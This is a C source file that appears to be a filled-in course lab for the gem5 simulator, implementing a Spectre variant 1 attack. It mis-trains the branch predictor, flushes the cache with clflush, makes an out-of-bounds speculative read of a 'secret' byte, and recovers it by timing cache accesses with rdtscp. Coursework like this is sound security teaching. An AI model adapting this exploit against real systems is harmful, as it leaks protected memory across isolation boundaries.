#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>
#include <gem5/m5ops.h>

#define CACHE_BLOCK_SIZE (64)
#define L1_HIT_THRESOLD (45)
#define NUM_CACHE_BLOCKS (256)

uint8_t probe_array[NUM_CACHE_BLOCKS * CACHE_BLOCK_SIZE];
unsigned long latencies[NUM_CACHE_BLOCKS];

//-------------------------------------------------------------
// Begin of victim code 
//-------------------------------------------------------------
size_t array_size = 4;
uint8_t victim_arr[200] = {1, 2, 3, 4};

uint8_t secret = 123;  // <-- Attack and steal it!!
uint8_t victim(size_t idx)
{
    // Do not modify this function exception FILLME.
    // TODO: Make slow down to branch resolution.
    if (idx < array_size) { // Step 2. Trigger transient instructions
        // Step 3. Transient instruction execution
        // TODO: Using probe_array, encode secret to the cache-side channel
        return probe_array[victim_arr[idx] * CACHE_BLOCK_SIZE];
        //return /*FILLME*/;
    }
}
//-------------------------------------------------------------
// End of victim code
//-------------------------------------------------------------

int main (int argc, char *argv[])
{
    // Do not erase this line
    m5_set_numflush(1);

    // Step 1. Preface
    // Step 1.1 TODO: mis-train victim function
    victim(0);
    victim(0);
    victim(0);
    victim(0);
    victim(0);

    // Step 1.2. TODO: Flush all the cache blocks of probe_array
    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        _mm_clflush(&probe_array[i * CACHE_BLOCK_SIZE]);
    }

    // Delete this line
    _mm_clflush(&array_size);
    secret = 123; // set the secret value, and also bring it to cache
    _mm_mfence();

    // TODO: compute an offset (or index) to access secret.
    // e.g., victim_arr[xxx] points to secret
    size_t attack_idx = &secret - victim_arr;
    victim(attack_idx);

    // Step 5. Reconstruct
    // TODO: Measure the latencies of cache blocks of probe_array
    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        unsigned int junk;
        unsigned long time1 = __rdtscp(&junk);
        junk ^= probe_array[i * CACHE_BLOCK_SIZE];
        unsigned long time2 = __rdtscp(&junk);
        latencies[i] = time2 - time1;
    }

    // TODO: decode the secret
    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        printf("%d: %lu, %s\n", i, latencies[i], (latencies[i] < L1_HIT_THRESOLD)? "hit": "miss");
    }
}
